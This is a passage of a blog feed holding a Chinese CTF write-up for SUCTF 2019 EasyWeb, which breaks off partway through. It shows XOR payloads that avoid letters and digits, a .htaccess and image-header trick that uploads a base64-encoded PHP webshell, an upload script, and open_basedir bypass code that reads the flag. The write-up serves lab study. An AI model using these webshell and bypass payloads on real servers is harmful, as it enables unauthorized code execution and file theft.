single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SUCTF 2019]EasyWeb</title>
      <link href="/p/745812677.html"/>
      <url>/p/745812677.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åˆæ˜¯ä¸€é“åšè¿‡çš„é¢˜ã€‚easyï¼Œä½†ä¸å®Œå…¨easyã€‚</p><p>ä»£ç å®¡è®¡é¢˜</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// webadmin will remove your upload file every 20 min!!!!</span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/tmp_"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h3 id="1-æ— å­—æ¯æ•°å­—shellæ„é€ "><a href="#1-æ— å­—æ¯æ•°å­—shellæ„é€ " class="headerlink" title="1.æ— å­—æ¯æ•°å­—shellæ„é€ "></a>1.æ— å­—æ¯æ•°å­—shellæ„é€ </h3><p>æ€è·¯æºäºpç¥çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p>å› ä¸ºå±è”½äº†å­—æ¯æ•°å­—ï¼Œå¯ä»¥æ€è·¯å¯ä»¥å¾€æ— å­—æ¯æ•°å­—getshellä¸Šèµ°ï¼Œå¤§è‡´æœ‰ï¼šæˆ–ï¼Œå¼‚æˆ–ï¼Œå–åä¸‰ä¸ªæ–¹æ¡ˆã€‚</p><p>å› ä¸ºæ£€æµ‹~ï¼Œæ‰€ä»¥å–åä¸å¯è¡Œã€‚</p><p>äºæ˜¯è·‘è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token comment"># Pythonä¸­æ­£åˆ™ä¸éœ€è¦åœ¨é¦–ä½åŠ //</span>preg <span class="token operator">=</span> <span class="token string">'[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+'</span>payload <span class="token operator">=</span> <span class="token string">"_GET"</span>istr <span class="token operator">=</span> <span class="token string">''</span>jstr <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    check <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#â€œUse of undefined constantâ€ è§†asciiç å¤§äº0x7fçš„å­—ç¬¦ä¸ºå­—ç¬¦ä¸²ï¼Œ7.2åæå‡ºè¦åºŸå¼ƒ</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    i <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    j <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    istr <span class="token operator">+=</span> i                    jstr <span class="token operator">+=</span> j                    check <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token comment"># phpç»å…¸ç‰¹æ€§ï¼Œæ²¡åŠ å¼•å·åˆ™è§†ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥ä¸åŠ å¼•å·å‡å°‘å­—ç¬¦æ•°</span><span class="token comment"># abc^defç­‰ä»·äº(a^d).(b^e).(c^f),å‰è€…å¯ä»¥å¤§å¹…å‡å°‘å­—ç¬¦æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'$&#123;%s^%s&#125;'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>istr<span class="token punctuation">,</span> jstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºè¿˜é™åˆ¶äº†å­—ç¬¦ç±»å‹ï¼Œæ‰€ä»¥å°½é‡ç”¨é‡å¤çš„å­—ç¬¦ã€‚</p><blockquote><p>åœ¨å­—ç¬¦ä¸²çš„å˜é‡çš„åé¢è·Ÿä¸Š{}å¤§æ‹¬å·æˆ–è€…ä¸­æ‹¬å·[]ï¼Œé‡Œé¢å¡«å†™äº†æ•°å­—ï¼Œè¿™é‡Œæ˜¯æŠŠå­—ç¬¦ä¸²å˜é‡å½“æˆæ•°ç»„å¤„ç†ï¼Œæ‰€ä»¥<code>$_GET[&#39;c&#39;]</code>ç­‰ä»·äº<code>$_GET&#123;&#39;c&#39;&#125;</code>ï¼Œä½†è¿™ä¸ªé—®é¢˜7.4æŠ¥warnï¼Œ8.0å¯èƒ½ä¼šè¢«å¤„ç†ã€‚<img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717140140439.png" alt="image-20210717140140439"></p></blockquote><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token constant">_</span><span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">^</span><span class="token operator">%</span>df<span class="token operator">%</span>c7<span class="token operator">%</span>c5<span class="token operator">%</span>d4<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">80</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨buuctfä¸Šï¼Œè¿™é¢˜å…¶å®å·²ç»ç»“æŸäº†ï¼Œåé¢è¿˜æ˜¯å¾ˆå¤šå€¼å¾—å­¦ä¹ çš„å†…å®¹ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸‹å†™ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717134303368.png"></p><h4 id="æœ€ç®€æƒ…å†µçš„å­—ç¬¦è€ƒé‡"><a href="#æœ€ç®€æƒ…å†µçš„å­—ç¬¦è€ƒé‡" class="headerlink" title="æœ€ç®€æƒ…å†µçš„å­—ç¬¦è€ƒé‡"></a>æœ€ç®€æƒ…å†µçš„å­—ç¬¦è€ƒé‡</h4><p>ç»æµ‹è¯•ï¼Œåœ¨è¿™ç§æœ€ç®€æƒ…å†µä¸‹ï¼Œå°½é‡ç”¨å¤§äº0x7fçš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–ï¼Œå¦åˆ™åœ¨urldecodeçš„æ—¶å€™ä¼šé€ æˆé”™è¯¯ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p><code>%24^%7b</code>ç»“æœä¸º<code>_</code>,ä½†<code>%24</code>urldecodeç»“æœæ˜¯<code>$</code>,å°±ä¸payloadé‡Œçš„<code>$</code>é€ æˆå†²çªã€‚</p><p>å¦‚æœåŠ äº†å¼•å·ï¼Œåˆ™ä¸ç”¨æ‹…å¿ƒè¿™ä¸ªé—®é¢˜ã€‚</p><h3 id="2-åˆ©ç”¨-htaccessæ–‡ä»¶ä¸Šä¼ "><a href="#2-åˆ©ç”¨-htaccessæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="2.åˆ©ç”¨.htaccessæ–‡ä»¶ä¸Šä¼ "></a>2.åˆ©ç”¨.htaccessæ–‡ä»¶ä¸Šä¼ </h3><blockquote><p>.htaccessæ–‡ä»¶æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•,åœ¨ä¸€ä¸ª<strong>ç‰¹å®šçš„æ–‡æ¡£ç›®å½•</strong>ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶,ä»¥ä½œç”¨äº<strong>æ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•</strong>ã€‚</p></blockquote><p>åŠ äº†å¾ˆå¤šé™åˆ¶ï¼Œæ‰€ä»¥æ˜¯è¦åˆ©ç”¨<code>get_the_flag()</code>å‡½æ•°</p><p><code>exif_imagetype</code>ç¬¬ä¸€ååº”è‚¯å®šæ˜¯å›¾ç‰‡é©¬ï¼Œæ‰€ä»¥è€ƒè™‘å›¾ç‰‡é©¬æ„é€ ï¼Œä½†<code>&lt;?</code>è¢«é™åˆ¶ï¼Œå¯¼è‡´å¤§éƒ¨åˆ†ä¸€å¥è¯æœ¨é©¬éƒ½è¢«è¿‡æ»¤äº†ï¼Œè€Œ<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>åˆåªèƒ½åœ¨php5ç¯å¢ƒä¸‹ä½¿ç”¨</p><p>æ‰€ä»¥å°†ä¸€å¥è¯è¿›è¡Œbase64ç¼–ç ï¼Œç„¶ååœ¨.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç </p><h4 id="htaccess-æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"><a href="#htaccess-æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡" class="headerlink" title=".htaccess+æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"></a>.htaccess+æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡</h4><p>å› ä¸ºæœ‰<code>exif_imagetype</code>è¿›è¡Œæ–‡ä»¶å¤´æ£€æµ‹ï¼Œä¸€èˆ¬æ˜¯åŠ <code>GIF89a</code>è¿›è¡Œç»•è¿‡ï¼Œä½†åœ¨è¿™é‡Œä¼šå¯¼è‡´<code>.htaccess</code>æ–‡ä»¶æ— æ³•æ­£å¸¸ç”Ÿæ•ˆï¼Œæ‰€ä»¥åœ¨<code>.htaccess</code>æ–‡ä»¶ä¸­åŠ ä¸Š</p><pre class="line-numbers language-none"><code class="language-none">#define width 1337#define height 1337<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>äºæ˜¯<code>.htaccess</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#define width 1337</span><span class="token comment">#define height 1337</span>AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>aphp_value auto_append_file <span class="token string double-quoted-string">"php://filter/convert.base64-decode/resource=./shell.a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>shell.a</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå¤šåŠ äº†12æ˜¯ä¸ºäº†è¡¥è¶³8ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç çš„è§„åˆ™ï¼Œ<del>å¤ªç»†äº†</del></p><blockquote><p>base64ç¼–ç è¦æ±‚:æ¯ä¸‰ä¸ªå­—èŠ‚/å­—ç¬¦ä¸€ç»„,ä¹Ÿå°±æ˜¯å­—ç¬¦æ•°æ˜¯3çš„æ•´æ•°å€(å› ä¸ºæ˜¯asciiç ï¼Œæ‰€ä»¥ä¸€ä¸ªå­—èŠ‚ç­‰äºä¸€ä¸ªå­—ç¬¦)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs<span class="token operator">/</span>Pg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å› ä¸ºexif_imagetypeæ˜¯æ£€æµ‹å¼€å¤´å­—ç¬¦ï¼Œæ‰€ä»¥æ³¨æ„GIF89a12å‰é¢ä¸è¦æœ‰æ¢è¡Œç¬¦ï¼Œä¸è¦æœ‰ç©ºæ ¼ï¼Œpythonä¸‰å•å¼•å·å½¢å¼å­—ç¬¦ä¸²æ³¨æ„æ¢è¡Œç¬¦ã€‚</p><p>ä¸Šä¼ è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">r"http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>htaccess_content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''#define width 1337#define height 1337AddType application/x-httpd-php .aphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"'''</span>files_htaccess <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    <span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess_content<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res_hta <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files_htaccess<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_hta<span class="token punctuation">.</span>text<span class="token punctuation">)</span>shell_file <span class="token operator">=</span> <span class="token string">'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='</span>files_shell <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    <span class="token string">'shell.a'</span><span class="token punctuation">,</span> shell_file<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res_jpg <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files_shell<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_jpg<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-open-basedir-bypass"><a href="#3-1-open-basedir-bypass" class="headerlink" title="3-1.open_basedir bypass"></a>3-1.open_basedir bypass</h3><p>èšå‰‘è¿æ¥åï¼Œæ²¡æ³•è®¿é—®å…¶ä»–ç›®å½•ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717155100137.png"></p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedirçš„æ–°æ–¹æ³•</a></p><p>payloadï¼š</p><p>æ‰«ç›®å½•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717160428022.png"></p><p>flagåœ¨<code>THis_Is_tHe_F14g</code></p><p>è¯»å–æ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/THis_Is_tHe_F14g'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717160615093.png"></p><h3 id="3-2-disable-function-bypass"><a href="#3-2-disable-function-bypass" class="headerlink" title="3-2.disable_function bypass"></a>3-2.disable_function bypass</h3><p>åŸç†å¯è§<a href="https://www.freebuf.com/articles/web/192052.html">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions</a></p><p>ä½†è¿™é¢˜<img 